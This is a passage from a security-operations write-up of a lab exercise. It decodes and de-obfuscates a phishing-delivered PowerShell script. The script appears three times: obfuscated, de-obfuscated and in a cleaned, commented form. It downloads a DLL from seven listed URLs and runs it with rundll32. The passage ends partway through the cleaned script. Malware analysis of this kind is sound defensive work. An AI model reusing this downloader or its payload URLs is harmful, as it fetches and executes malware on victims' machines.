<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="Scenario
Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware. The damage caused was critical and resulted in business-wide disruption. GothamLegend had to reach out to a third-party incident response team to assist with the investigation. You are a member of the IR team - all you have is an encoded Powershell script. Can you decode it and identify what malware is responsible for this attack?" />
<meta name="keywords" content=", btlo, soc, http, powershell, malware, web" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/writeups/btlo/security-operations/gothamlegend-incident-response--powershell-malware-analysis/" />


    <title>
        
            GothamLegend Incident Response – PowerShell Malware Analysis :: Hello w3nch 
        
    </title>





  <link rel="stylesheet" href="/main.min.ebe3824dfa5345ef854f8b255c278f701966e9be3892354b588fb1650ecd358e.css" integrity="sha256-6&#43;OCTfpTRe&#43;FT4slXCePcBlm6b44kjVLWI&#43;xZQ7NNY4=" crossorigin="anonymous">




    
        <link rel="stylesheet" type="text/css" href="css/code.css">
    

    
        <link rel="stylesheet" type="text/css" href="css/writeups.css">
    


    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="GothamLegend Incident Response – PowerShell Malware Analysis">
<meta itemprop="description" content="Scenario
Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware. The damage caused was critical and resulted in business-wide disruption. GothamLegend had to reach out to a third-party incident response team to assist with the investigation. You are a member of the IR team - all you have is an encoded Powershell script. Can you decode it and identify what malware is responsible for this attack?"><meta itemprop="datePublished" content="2026-01-15T00:00:00+00:00" />
<meta itemprop="dateModified" content="2026-01-15T00:00:00+00:00" />
<meta itemprop="wordCount" content="1211">
<meta itemprop="keywords" content="btlo,soc,http,powershell,malware,web," />
<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="GothamLegend Incident Response – PowerShell Malware Analysis"/>
<meta name="twitter:description" content="Scenario
Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware. The damage caused was critical and resulted in business-wide disruption. GothamLegend had to reach out to a third-party incident response team to assist with the investigation. You are a member of the IR team - all you have is an encoded Powershell script. Can you decode it and identify what malware is responsible for this attack?"/>





    <meta property="article:section" content="SOC Writeups" />

    <meta property="article:section" content="Security Operations" />



    <meta property="article:published_time" content="2026-01-15 00:00:00 &#43;0000 UTC" />












    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text ">
                hello</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
                <nav class="menu">
    <ul class="menu__inner">
                <li><a href="/about/">About</a></li>
            
                <li><a href="/posts/">Blog</a></li>
            
                <li><a href="/contact/">Contact</a></li>
            
                <li><a href="/resume.pdf">Resume</a></li>
            
                <li><a href="/writeups/">Writeups</a></li>
            
    </ul>
</nav>


                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            
    <div class="content">
        <main class="post">

            <div class="post-info">
                
                </p>
            </div>

            <article>
                <h2 class="post-title"><a href="http://localhost:1313/writeups/btlo/security-operations/gothamlegend-incident-response--powershell-malware-analysis/">GothamLegend Incident Response – PowerShell Malware Analysis</a></h2>

                
                
                

                <div class="post-content">
                    <p><strong>Scenario</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware.
</span></span><span style="display:flex;"><span>The damage caused was critical and resulted in business-wide disruption. GothamLegend had to reach out to a third-party incident response team to 
</span></span><span style="display:flex;"><span>assist with the investigation. You are a member of the IR team - all you have is an encoded Powershell script. Can you decode it and identify what
</span></span><span style="display:flex;"><span>malware is responsible for this attack?
</span></span></code></pre></div><h2 id="analysis">Analysis</h2>
<p>We are provided with a ZIP archive containing a file named <strong><code>ps_script.txt</code></strong>.<br>
Inspection of this file shows a PowerShell command using the <code>-EncodedCommand</code> (<code>-enc</code>) flag.</p>
<p>PowerShell’s <code>-EncodedCommand</code> option uses:</p>
<ul>
<li><strong>Base64 encoding</strong></li>
<li><strong>UTF-16LE character encoding</strong></li>
</ul>
<p>This technique is commonly used by malware to evade detection and hide malicious intent.
<img src="https://i.ibb.co/845fDqDp/Pasted-image-20260115161838.png" alt="">
To safely decode the payload without executing it, the encoded Base64 string is extracted and decoded using standard Linux utilities.</p>
<h4 id="one-liner-used-for-decoding">One-liner used for decoding:</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -o <span style="color:#e6db74">&#39;[A-Za-z0-9+/=]\{500,\}&#39;</span> ps_script.txt <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>| tr -d <span style="color:#e6db74">&#39;\n\r &#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>| base64 -d <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>| iconv -f UTF-16LE -t UTF-8 <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>| sed <span style="color:#e6db74">&#39;s/`//g&#39;</span> &gt; decoded.ps1
</span></span></code></pre></div><p><img src="https://i.ibb.co/QFX0prvQ/Pasted-image-20260115161930.png" alt=""></p>
<p>This process:</p>
<ul>
<li>Extracts only the Base64 payload</li>
<li>Cleans whitespace and formatting</li>
<li>Decodes UTF-16LE PowerShell content</li>
<li>Removes PowerShell backtick obfuscation</li>
</ul>
<p>This same thing can be done in cyberchef with using base64 decode and remove null byte
<img src="https://i.ibb.co/C3nk3yLK/Pasted-image-20260115163235.png" alt=""></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span> sEt MKu ( [<span style="color:#66d9ef">TYPe</span>](<span style="color:#e6db74">&#34;{0}{1}{2}{4}{3}&#34;</span> <span style="color:#f92672">-F</span> <span style="color:#e6db74">&#39;SYsT&#39;</span>,<span style="color:#e6db74">&#39;eM.&#39;</span>,<span style="color:#e6db74">&#39;io.DI&#39;</span>,<span style="color:#e6db74">&#39;ORY&#39;</span>,<span style="color:#e6db74">&#39;rECt&#39;</span>) );    SeT-iTEM  (<span style="color:#e6db74">&#39;vaR&#39;</span>+<span style="color:#e6db74">&#39;IabLE&#39;</span>+<span style="color:#e6db74">&#39;:mBu&#39;</span>) (  [<span style="color:#66d9ef">TYPe</span>](<span style="color:#e6db74">&#34;{6}{8}{0}{3}{4}{5}{2}{7}{1}&#34;</span> <span style="color:#f92672">-f</span><span style="color:#e6db74">&#39;SteM&#39;</span>,<span style="color:#e6db74">&#39;Ger&#39;</span>,<span style="color:#e6db74">&#39;Ma&#39;</span>,<span style="color:#e6db74">&#39;.n&#39;</span>,<span style="color:#e6db74">&#39;et.seRVIcepOi&#39;</span>,<span style="color:#e6db74">&#39;nt&#39;</span>,<span style="color:#e6db74">&#39;s&#39;</span>,<span style="color:#e6db74">&#39;NA&#39;</span>,<span style="color:#e6db74">&#39;Y&#39;</span>)); $ErrorActionPreference = ((<span style="color:#e6db74">&#39;S&#39;</span>+<span style="color:#e6db74">&#39;il&#39;</span>)+(<span style="color:#e6db74">&#39;en&#39;</span>+<span style="color:#e6db74">&#39;t&#39;</span>)+<span style="color:#e6db74">&#39;ly&#39;</span>+(<span style="color:#e6db74">&#39;Cont&#39;</span>+<span style="color:#e6db74">&#39;i&#39;</span>+<span style="color:#e6db74">&#39;nue&#39;</span>));$Cvmmq4o=$Q26L + [<span style="color:#66d9ef">char</span>](<span style="color:#ae81ff">64</span>) + $E16H;$J16J=(<span style="color:#e6db74">&#39;N&#39;</span>+(<span style="color:#e6db74">&#39;_0&#39;</span>+<span style="color:#e6db74">&#39;P&#39;</span>)); (DIr VariabLE<span style="color:#960050;background-color:#1e0010">:</span>Mku  ).VaLUe::<span style="color:#e6db74">&#34;cREAtedIRECTORy&#34;</span>($HOME + ((<span style="color:#e6db74">&#39;{&#39;</span>+<span style="color:#e6db74">&#39;0}Db_bh&#39;</span>+<span style="color:#e6db74">&#39;30&#39;</span>+<span style="color:#e6db74">&#39;{0}&#39;</span>+<span style="color:#e6db74">&#39;Yf&#39;</span>+<span style="color:#e6db74">&#39;5be5g{0}&#39;</span>) <span style="color:#f92672">-F</span> [<span style="color:#66d9ef">chAR</span>]<span style="color:#ae81ff">92</span>));$C39Y=((<span style="color:#e6db74">&#39;U6&#39;</span>+<span style="color:#e6db74">&#39;8&#39;</span>)+<span style="color:#e6db74">&#39;S&#39;</span>);  ( vARiaBLe  (<span style="color:#e6db74">&#34;m&#34;</span>+<span style="color:#e6db74">&#34;bu&#34;</span>)  -VAlueoN  )::<span style="color:#e6db74">&#34;sEcuRITYproTocol&#34;</span> = (<span style="color:#e6db74">&#39;T&#39;</span>+(<span style="color:#e6db74">&#39;ls&#39;</span>+<span style="color:#e6db74">&#39;12&#39;</span>));$F35I=(<span style="color:#e6db74">&#39;I&#39;</span>+(<span style="color:#e6db74">&#39;4&#39;</span>+<span style="color:#e6db74">&#39;_B&#39;</span>));$Swrp6tc = ((<span style="color:#e6db74">&#39;A6&#39;</span>+<span style="color:#e6db74">&#39;9&#39;</span>)+<span style="color:#e6db74">&#39;S&#39;</span>);$X27H=(<span style="color:#e6db74">&#39;C3&#39;</span>+<span style="color:#e6db74">&#39;3O&#39;</span>);$Imd1yck=$HOME+(((<span style="color:#e6db74">&#39;UO&#39;</span>+<span style="color:#e6db74">&#39;H&#39;</span>+<span style="color:#e6db74">&#39;Db_&#39;</span>)+<span style="color:#e6db74">&#39;b&#39;</span>+(<span style="color:#e6db74">&#39;h3&#39;</span>+<span style="color:#e6db74">&#39;0UO&#39;</span>)+(<span style="color:#e6db74">&#39;HY&#39;</span>+<span style="color:#e6db74">&#39;f&#39;</span>)+(<span style="color:#e6db74">&#39;5be5&#39;</span>+<span style="color:#e6db74">&#39;g&#39;</span>+<span style="color:#e6db74">&#39;UOH&#39;</span>)).<span style="color:#e6db74">&#34;RePlACe&#34;</span>((<span style="color:#e6db74">&#39;U&#39;</span>+<span style="color:#e6db74">&#39;OH&#39;</span>),[<span style="color:#66d9ef">StrInG][chAr</span>]<span style="color:#ae81ff">92</span>))+$Swrp6tc+((<span style="color:#e6db74">&#39;.&#39;</span>+<span style="color:#e6db74">&#39;dl&#39;</span>)+<span style="color:#e6db74">&#39;l&#39;</span>);$K47V=(<span style="color:#e6db74">&#39;R&#39;</span>+(<span style="color:#e6db74">&#39;4&#39;</span>+<span style="color:#e6db74">&#39;9G&#39;</span>));$B9fhbyv=(<span style="color:#e6db74">&#39;]&#39;</span>+(<span style="color:#e6db74">&#39;a&#39;</span>+<span style="color:#e6db74">&#39;nw[3s://adm&#39;</span>+<span style="color:#e6db74">&#39;int&#39;</span>+<span style="color:#e6db74">&#39;k.c&#39;</span>+<span style="color:#e6db74">&#39;o&#39;</span>+<span style="color:#e6db74">&#39;m/&#39;</span>+<span style="color:#e6db74">&#39;w&#39;</span>)+(<span style="color:#e6db74">&#39;p-adm&#39;</span>+<span style="color:#e6db74">&#39;in/&#39;</span>+<span style="color:#e6db74">&#39;L/&#39;</span>)+<span style="color:#e6db74">&#39;@&#39;</span>+(<span style="color:#e6db74">&#39;]a&#39;</span>+<span style="color:#e6db74">&#39;n&#39;</span>+<span style="color:#e6db74">&#39;w[3s&#39;</span>)+<span style="color:#e6db74">&#39;:&#39;</span>+<span style="color:#e6db74">&#39;/&#39;</span>+<span style="color:#e6db74">&#39;/m&#39;</span>+(<span style="color:#e6db74">&#39;ike&#39;</span>+<span style="color:#e6db74">&#39;ge&#39;</span>)+(<span style="color:#e6db74">&#39;e&#39;</span>+<span style="color:#e6db74">&#39;r&#39;</span>+<span style="color:#e6db74">&#39;inck.&#39;</span>)+(<span style="color:#e6db74">&#39;c&#39;</span>+<span style="color:#e6db74">&#39;om&#39;</span>)+(<span style="color:#e6db74">&#39;/c/&#39;</span>+<span style="color:#e6db74">&#39;Y&#39;</span>+<span style="color:#e6db74">&#39;Ys&#39;</span>)+<span style="color:#e6db74">&#39;a&#39;</span>+(<span style="color:#e6db74">&#39;/@]&#39;</span>+<span style="color:#e6db74">&#39;anw&#39;</span>+<span style="color:#e6db74">&#39;[&#39;</span>+<span style="color:#e6db74">&#39;3://free&#39;</span>+<span style="color:#e6db74">&#39;lanc&#39;</span>+<span style="color:#e6db74">&#39;e&#39;</span>+<span style="color:#e6db74">&#39;rw&#39;</span>)+(<span style="color:#e6db74">&#39;ebdesi&#39;</span>+<span style="color:#e6db74">&#39;gnerh&#39;</span>+<span style="color:#e6db74">&#39;yd&#39;</span>)+(<span style="color:#e6db74">&#39;er&#39;</span>+<span style="color:#e6db74">&#39;aba&#39;</span>)+(<span style="color:#e6db74">&#39;d.&#39;</span>+<span style="color:#e6db74">&#39;com/&#39;</span>)+(<span style="color:#e6db74">&#39;cgi&#39;</span>+<span style="color:#e6db74">&#39;-bin&#39;</span>+<span style="color:#e6db74">&#39;/S&#39;</span>)+(<span style="color:#e6db74">&#39;/&#39;</span>+<span style="color:#e6db74">&#39;@&#39;</span>+<span style="color:#e6db74">&#39;]anw&#39;</span>)+(<span style="color:#e6db74">&#39;[3&#39;</span>+<span style="color:#e6db74">&#39;://&#39;</span>+<span style="color:#e6db74">&#39;etdog.co&#39;</span>+<span style="color:#e6db74">&#39;m&#39;</span>+<span style="color:#e6db74">&#39;/w&#39;</span>)+(<span style="color:#e6db74">&#39;p-&#39;</span>+<span style="color:#e6db74">&#39;co&#39;</span>)+<span style="color:#e6db74">&#39;nt&#39;</span>+(<span style="color:#e6db74">&#39;e&#39;</span>+<span style="color:#e6db74">&#39;nt&#39;</span>)+(<span style="color:#e6db74">&#39;/n&#39;</span>+<span style="color:#e6db74">&#39;u/@&#39;</span>)+(<span style="color:#e6db74">&#39;]a&#39;</span>+<span style="color:#e6db74">&#39;nw[3&#39;</span>)+<span style="color:#e6db74">&#39;s&#39;</span>+(<span style="color:#e6db74">&#39;://&#39;</span>+<span style="color:#e6db74">&#39;www&#39;</span>+<span style="color:#e6db74">&#39;.hintu&#39;</span>+<span style="color:#e6db74">&#39;p.c&#39;</span>)+(<span style="color:#e6db74">&#39;o&#39;</span>+<span style="color:#e6db74">&#39;m.&#39;</span>)+(<span style="color:#e6db74">&#39;b&#39;</span>+<span style="color:#e6db74">&#39;r/&#39;</span>)+<span style="color:#e6db74">&#39;w&#39;</span>+(<span style="color:#e6db74">&#39;p&#39;</span>+<span style="color:#e6db74">&#39;-co&#39;</span>)+(<span style="color:#e6db74">&#39;n&#39;</span>+<span style="color:#e6db74">&#39;ten&#39;</span>)+(<span style="color:#e6db74">&#39;t&#39;</span>+<span style="color:#e6db74">&#39;/dE/&#39;</span>+<span style="color:#e6db74">&#39;@]a&#39;</span>+<span style="color:#e6db74">&#39;nw[3://&#39;</span>+<span style="color:#e6db74">&#39;www.&#39;</span>)+<span style="color:#e6db74">&#39;s&#39;</span>+(<span style="color:#e6db74">&#39;tm&#39;</span>+<span style="color:#e6db74">&#39;arouns&#39;</span>+<span style="color:#e6db74">&#39;.&#39;</span>)+(<span style="color:#e6db74">&#39;ns&#39;</span>+<span style="color:#e6db74">&#39;w&#39;</span>)+(<span style="color:#e6db74">&#39;.&#39;</span>+<span style="color:#e6db74">&#39;edu.au/p&#39;</span>+<span style="color:#e6db74">&#39;a&#39;</span>+<span style="color:#e6db74">&#39;y&#39;</span>+<span style="color:#e6db74">&#39;pal/b8&#39;</span>)+(<span style="color:#e6db74">&#39;G&#39;</span>+<span style="color:#e6db74">&#39;/@]&#39;</span>)+(<span style="color:#e6db74">&#39;a&#39;</span>+<span style="color:#e6db74">&#39;nw[&#39;</span>)+(<span style="color:#e6db74">&#39;3:&#39;</span>+<span style="color:#e6db74">&#39;/&#39;</span>)+(<span style="color:#e6db74">&#39;/&#39;</span>+<span style="color:#e6db74">&#39;wm.mcdeve&#39;</span>+<span style="color:#e6db74">&#39;lop.net&#39;</span>+<span style="color:#e6db74">&#39;/&#39;</span>+<span style="color:#e6db74">&#39;c&#39;</span>+<span style="color:#e6db74">&#39;on&#39;</span>+<span style="color:#e6db74">&#39;t&#39;</span>+<span style="color:#e6db74">&#39;e&#39;</span>)+(<span style="color:#e6db74">&#39;nt&#39;</span>+<span style="color:#e6db74">&#39;/&#39;</span>)+<span style="color:#e6db74">&#39;6&#39;</span>+(<span style="color:#e6db74">&#39;F2&#39;</span>+<span style="color:#e6db74">&#39;gd/&#39;</span>)).<span style="color:#e6db74">&#34;REplACe&#34;</span>(((<span style="color:#e6db74">&#39;]a&#39;</span>+<span style="color:#e6db74">&#39;n&#39;</span>)+(<span style="color:#e6db74">&#39;w&#39;</span>+<span style="color:#e6db74">&#39;[3&#39;</span>)),([<span style="color:#66d9ef">array</span>](<span style="color:#e6db74">&#39;sd&#39;</span>,<span style="color:#e6db74">&#39;sw&#39;</span>),((<span style="color:#e6db74">&#39;h&#39;</span>+<span style="color:#e6db74">&#39;tt&#39;</span>)+<span style="color:#e6db74">&#39;p&#39;</span>),<span style="color:#e6db74">&#39;3d&#39;</span>)[<span style="color:#ae81ff">1</span>]).<span style="color:#e6db74">&#34;sPLIT&#34;</span>($C83R + $Cvmmq4o + $F10Q);$Q52M=(<span style="color:#e6db74">&#39;P&#39;</span>+(<span style="color:#e6db74">&#39;0&#39;</span>+<span style="color:#e6db74">&#39;5K&#39;</span>));<span style="color:#66d9ef">foreach</span> ($Bm5pw6z <span style="color:#66d9ef">in</span> $B9fhbyv){<span style="color:#66d9ef">try</span>{(&amp;(<span style="color:#e6db74">&#39;New&#39;</span>+<span style="color:#e6db74">&#39;-Objec&#39;</span>+<span style="color:#e6db74">&#39;t&#39;</span>) SysTem.nEt.WEBcLIeNT).<span style="color:#e6db74">&#34;doWNlOaDFIlE&#34;</span>($Bm5pw6z, $Imd1yck);$Z10L=(<span style="color:#e6db74">&#39;A9&#39;</span>+<span style="color:#e6db74">&#39;2Q&#39;</span>);<span style="color:#66d9ef">If</span> ((&amp;(<span style="color:#e6db74">&#39;Ge&#39;</span>+<span style="color:#e6db74">&#39;t-It&#39;</span>+<span style="color:#e6db74">&#39;em&#39;</span>) $Imd1yck).<span style="color:#e6db74">&#34;lenGTH&#34;</span> <span style="color:#f92672">-ge</span> <span style="color:#ae81ff">35698</span>) {&amp;(<span style="color:#e6db74">&#39;r&#39;</span>+<span style="color:#e6db74">&#39;undl&#39;</span>+<span style="color:#e6db74">&#39;l32&#39;</span>) $Imd1yck,((<span style="color:#e6db74">&#39;Co&#39;</span>+<span style="color:#e6db74">&#39;nt&#39;</span>)+<span style="color:#e6db74">&#39;r&#39;</span>+(<span style="color:#e6db74">&#39;ol&#39;</span>+<span style="color:#e6db74">&#39;_RunD&#39;</span>+<span style="color:#e6db74">&#39;L&#39;</span>)+<span style="color:#e6db74">&#39;L&#39;</span>).<span style="color:#e6db74">&#34;TOStRiNG&#34;</span>();$R65I=(<span style="color:#e6db74">&#39;Z&#39;</span>+(<span style="color:#e6db74">&#39;09&#39;</span>+<span style="color:#e6db74">&#39;B&#39;</span>));<span style="color:#66d9ef">break</span>;$K7_H=(<span style="color:#e6db74">&#39;F1&#39;</span>+<span style="color:#e6db74">&#39;2U&#39;</span>)}}<span style="color:#66d9ef">catch</span>{}}$W54I=((<span style="color:#e6db74">&#39;V9&#39;</span>+<span style="color:#e6db74">&#39;5&#39;</span>)+<span style="color:#e6db74">&#39;O&#39;</span>)
</span></span></code></pre></div><h4 id="decoded-script-obfuscated">Decoded Script (Obfuscated)</h4>
<p>The decoded file still contains heavy obfuscation techniques such as:</p>
<ul>
<li>Randomized casing</li>
<li>String concatenation</li>
<li>Backticks within keywords</li>
<li>Dynamic variable resolution
These techniques are commonly used to evade static detection by antivirus and EDR solutions.</li>
</ul>
<h4 id="de-obfuscation">De-obfuscation</h4>
<p>The script was further de-obfuscated using an online PowerShell de-obfuscation utility.<br>
This revealed the true intent and behavior of the script.
<a href="https://minusone.skyblue.team/script/fb35cd83-22f5-4037-8c82-2f83772ea9c0">https://minusone.skyblue.team/script/fb35cd83-22f5-4037-8c82-2f83772ea9c0</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>set MKu ([<span style="color:#66d9ef">Type</span>]<span style="color:#e6db74">&#34;SYsTeM.io.DIrECtORY&#34;</span>)
</span></span><span style="display:flex;"><span>Set-Item <span style="color:#e6db74">&#34;vaRIabLE:mBu&#34;</span> ([<span style="color:#66d9ef">Type</span>]<span style="color:#e6db74">&#34;sYSteM.net.seRVIcepOintMaNAGer&#34;</span>)
</span></span><span style="display:flex;"><span>$Cvmmq4o = $Q26L + <span style="color:#e6db74">&#34;@&#34;</span> + $E16H
</span></span><span style="display:flex;"><span>(dir VariabLE<span style="color:#960050;background-color:#1e0010">:</span>Mku).VaLUe::C`reat`edi`rec`tory($HOME + <span style="color:#e6db74">&#34;\Db_bh30\Yf5be5g\&#34;</span>)
</span></span><span style="display:flex;"><span>(variable <span style="color:#e6db74">&#34;mbu&#34;</span> -VAlueoN)::Securityprot`o`c`ol = <span style="color:#e6db74">&#34;Tls12&#34;</span>
</span></span><span style="display:flex;"><span>$Imd1yck = $HOME + (<span style="color:#e6db74">&#34;UOHDb_bh30UOHYf5be5gUOH&#34;</span>.Rep`lace(<span style="color:#e6db74">&#34;UOH&#34;</span>, <span style="color:#e6db74">&#34;\&#34;</span>)) + <span style="color:#e6db74">&#34;A69S&#34;</span> + <span style="color:#e6db74">&#34;.dll&#34;</span>
</span></span><span style="display:flex;"><span>$B9fhbyv = <span style="color:#e6db74">&#34;]anw[3s://admintk.com/wp-admin/L/@]anw[3s://mikegeerinck.com/c/YYsa/@]anw[3://freelancerwebdesignerhyderabad.com/cgi-bin/S/@]anw[3://etdog.com/wp-content/nu/@]anw[3s://www.hintup.com.br/wp-content/dE/@]anw[3://www.stmarouns.nsw.edu.au/paypal/b8G/@]anw[3://wm.mcdevelop.net/content/6F2gd/&#34;</span>.Re`p`lace(<span style="color:#e6db74">&#34;]anw[3&#34;</span>, ([<span style="color:#66d9ef">Array</span>](<span style="color:#e6db74">&#34;sd&#34;</span>, <span style="color:#e6db74">&#34;sw&#34;</span>), <span style="color:#e6db74">&#34;http&#34;</span>, <span style="color:#e6db74">&#34;3d&#34;</span>)[<span style="color:#ae81ff">1</span>]).S`plit($C83R + $Cvmmq4o + $F10Q)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($Bm5pw6z <span style="color:#66d9ef">in</span> $B9fhbyv){
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>  (&amp; <span style="color:#e6db74">&#34;new-object&#34;</span> SysTem.nEt.WEBcLIeNT).<span style="color:#66d9ef">Do</span>`wnl`oad`file($Bm5pw6z, $Imd1yck)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">If</span> ((&amp; <span style="color:#e6db74">&#34;get-item&#34;</span> $Imd1yck).Len`g`th <span style="color:#f92672">-ge</span> <span style="color:#ae81ff">35698</span>){
</span></span><span style="display:flex;"><span>   &amp; <span style="color:#e6db74">&#34;rundll32&#34;</span> $Imd1yck, <span style="color:#e6db74">&#34;Control_RunDLL&#34;</span>.T`ost`ring ()
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>     }
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">catch</span>{
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h4 id="fully-readable-powershell-cleaned">Fully Readable PowerShell (Cleaned)</h4>
<p>Here is the same version of the code with little updated so more easy to read we can see multiple things going on in the powershell script</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Use .NET Directory class</span>
</span></span><span style="display:flex;"><span>Set-Variable -Name MKu -Value ([<span style="color:#66d9ef">System.IO.Directory</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Use .NET ServicePointManager class</span>
</span></span><span style="display:flex;"><span>Set-Variable -Name mbu -Value ([<span style="color:#66d9ef">System.Net.ServicePointManager</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create working directory inside the user&#39;s home folder</span>
</span></span><span style="display:flex;"><span>$workDir = Join-Path $HOME <span style="color:#e6db74">&#34;Db_bh30\Yf5be5g&#34;</span>
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">System.IO.Directory</span>]::CreateDirectory($workDir) | Out-Null
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Force TLS 1.2 for HTTPS connections</span>
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">System.Net.ServicePointManager</span>]::SecurityProtocol = <span style="color:#e6db74">&#34;Tls12&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Path where the malicious DLL will be saved</span>
</span></span><span style="display:flex;"><span>$dllPath = Join-Path $workDir <span style="color:#e6db74">&#34;A69S.dll&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># List of payload delivery URLs</span>
</span></span><span style="display:flex;"><span>$urls = @(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;https://admintk.com/wp-admin/L/&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;https://mikegeerinck.com/c/YYsa/&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;https://freelancerwebdesignerhyderabad.com/cgi-bin/S/&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;https://etdog.com/wp-content/nu/&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;https://www.hintup.com.br/wp-content/dE/&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;https://www.stmarouns.nsw.edu.au/paypal/b8G/&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;https://wm.mcdevelop.net/content/6F2gd/&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Try downloading the DLL from each URL</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($url <span style="color:#66d9ef">in</span> $urls) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        $client = New-Object System.Net.WebClient
</span></span><span style="display:flex;"><span>        $client.DownloadFile($url, $dllPath)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Verify payload size (anti-404 / anti-junk check)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ((Get-Item $dllPath).Length <span style="color:#f92672">-ge</span> <span style="color:#ae81ff">35698</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Execute the downloaded DLL</span>
</span></span><span style="display:flex;"><span>            rundll32.exe $dllPath,Control_RunDLL
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Stop after first successful execution</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">catch</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Ignore errors and continue with next URL</span>
